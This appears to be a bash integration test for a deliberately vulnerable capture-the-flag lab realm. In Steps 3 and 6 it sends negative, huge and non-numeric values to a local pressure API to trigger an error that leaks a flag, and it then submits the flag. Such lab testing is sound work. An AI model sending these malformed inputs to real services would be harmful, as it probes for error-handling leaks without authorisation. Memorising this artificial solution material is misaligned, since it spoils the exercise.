#!/bin/bash
#
# Niflheim Realm Integration Test
# Tests the A10:2025 Exceptional Conditions vulnerability
#

set -e

echo "🧪 Testing Niflheim Realm (A10:2025 - Exceptional Conditions)"
echo "=============================================================="

# Configuration
GATEKEEPER_URL="${GATEKEEPER_URL:-http://localhost:8080}"
REALM_PATH="/realms/niflheim"
USER_ID="niflheim-test-$(date +%s)"

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Test counter
TESTS_PASSED=0
TESTS_FAILED=0

# Helper function for test assertions
assert_success() {
  if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓${NC} $1"
    ((TESTS_PASSED++))
  else
    echo -e "${RED}✗${NC} $1"
    ((TESTS_FAILED++))
  fi
}

assert_contains() {
  local haystack="$1"
  local needle="$2"
  local description="$3"
  
  if echo "$haystack" | grep -q "$needle"; then
    echo -e "${GREEN}✓${NC} $description"
    ((TESTS_PASSED++))
  else
    echo -e "${RED}✗${NC} $description"
    echo -e "  ${YELLOW}Expected to find:${NC} $needle"
    echo -e "  ${YELLOW}In response:${NC} ${haystack:0:100}..."
    ((TESTS_FAILED++))
  fi
}

echo ""
echo "Step 1: Verify realm is accessible via gatekeeper"
echo "---------------------------------------------------"

HEALTH_RESPONSE=$(curl -s "$GATEKEEPER_URL$REALM_PATH/health")
assert_contains "$HEALTH_RESPONSE" "niflheim" "Health check returns niflheim realm name"

echo ""
echo "Step 2: Test normal operation (valid pressure)"
echo "-----------------------------------------------"

NORMAL_RESPONSE=$(curl -s -X POST "$GATEKEEPER_URL$REALM_PATH/api/pressure" \
  -H "Content-Type: application/json" \
  -d '{"pressure": 50}')

assert_contains "$NORMAL_RESPONSE" "message" "Normal pressure update returns success message"
assert_contains "$NORMAL_RESPONSE" "state" "Normal pressure update includes state"

echo ""
echo "Step 3: Exploit - Trigger exception with negative pressure"
echo "-----------------------------------------------------------"

EXPLOIT_RESPONSE=$(curl -s -X POST "$GATEKEEPER_URL$REALM_PATH/api/pressure" \
  -H "Content-Type: application/json" \
  -d '{"pressure": -9999}')

echo "Response: ${EXPLOIT_RESPONSE:0:150}..."

assert_contains "$EXPLOIT_RESPONSE" "CRITICAL ERROR" "Error message contains critical error"
assert_contains "$EXPLOIT_RESPONSE" "EMERGENCY OVERRIDE" "Error message contains emergency override"
assert_contains "$EXPLOIT_RESPONSE" "YGGDRASIL{" "Error message contains flag"

echo ""
echo "Step 4: Extract flag from error response"
echo "-----------------------------------------"

# Extract flag using grep and regex
FLAG=$(echo "$EXPLOIT_RESPONSE" | grep -oP 'YGGDRASIL\{[^}]+\}' | head -1)

if [ -z "$FLAG" ]; then
  echo -e "${RED}✗${NC} Failed to extract flag from response"
  ((TESTS_FAILED++))
  echo "Response was: $EXPLOIT_RESPONSE"
  exit 1
else
  echo -e "${GREEN}✓${NC} Flag extracted: $FLAG"
  ((TESTS_PASSED++))
fi

echo ""
echo "Step 5: Validate flag format"
echo "-----------------------------"

if echo "$FLAG" | grep -qP '^YGGDRASIL\{NIFLHEIM:[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}\}$'; then
  echo -e "${GREEN}✓${NC} Flag format is valid: YGGDRASIL{NIFLHEIM:UUID}"
  ((TESTS_PASSED++))
else
  echo -e "${RED}✗${NC} Flag format is invalid: $FLAG"
  ((TESTS_FAILED++))
fi

echo ""
echo "Step 6: Test alternative exploit methods"
echo "-----------------------------------------"

# Test with extremely high pressure
HIGH_RESPONSE=$(curl -s -X POST "$GATEKEEPER_URL$REALM_PATH/api/pressure" \
  -H "Content-Type: application/json" \
  -d '{"pressure": 999999}')

assert_contains "$HIGH_RESPONSE" "YGGDRASIL{" "High pressure value also reveals flag"

# Test with non-numeric value
NAN_RESPONSE=$(curl -s -X POST "$GATEKEEPER_URL$REALM_PATH/api/pressure" \
  -H "Content-Type: application/json" \
  -d '{"pressure": "not-a-number"}')

assert_contains "$NAN_RESPONSE" "YGGDRASIL{" "Non-numeric value reveals flag"

echo ""
echo "Step 7: Submit flag to gatekeeper (optional)"
echo "---------------------------------------------"

if command -v jq &> /dev/null; then
  SUBMIT_RESPONSE=$(curl -s -X POST "$GATEKEEPER_URL/submit-flag" \
    -H "Content-Type: application/json" \
    -d "{\"userId\":\"$USER_ID\",\"flag\":\"$FLAG\"}")
  
  SUBMIT_STATUS=$(echo "$SUBMIT_RESPONSE" | jq -r '.status' 2>/dev/null || echo "error")
  
  if [ "$SUBMIT_STATUS" = "success" ]; then
    echo -e "${GREEN}✓${NC} Flag submitted successfully"
    ((TESTS_PASSED++))
    
    UNLOCKED_REALM=$(echo "$SUBMIT_RESPONSE" | jq -r '.unlocked' 2>/dev/null)
    echo "  Next realm unlocked: $UNLOCKED_REALM"
  else
    echo -e "${YELLOW}⚠${NC} Flag submission status: $SUBMIT_STATUS"
    echo "  Response: $SUBMIT_RESPONSE"
  fi
else
  echo -e "${YELLOW}⚠${NC} jq not installed, skipping flag submission test"
fi

echo ""
echo "Step 8: Verify system status endpoint"
echo "--------------------------------------"

STATUS_RESPONSE=$(curl -s "$GATEKEEPER_URL$REALM_PATH/api/status")
assert_contains "$STATUS_RESPONSE" "currentPressure" "Status endpoint returns current pressure"
assert_contains "$STATUS_RESPONSE" "doorStatus" "Status endpoint returns door status"

echo ""
echo "=============================================================="
echo "Test Summary"
echo "=============================================================="
echo -e "Tests Passed: ${GREEN}$TESTS_PASSED${NC}"
echo -e "Tests Failed: ${RED}$TESTS_FAILED${NC}"
echo ""

if [ $TESTS_FAILED -eq 0 ]; then
  echo -e "${GREEN}✅ All Niflheim tests PASSED${NC}"
  echo ""
  echo "Flag captured: $FLAG"
  exit 0
else
  echo -e "${RED}❌ Some tests FAILED${NC}"
  exit 1
fi
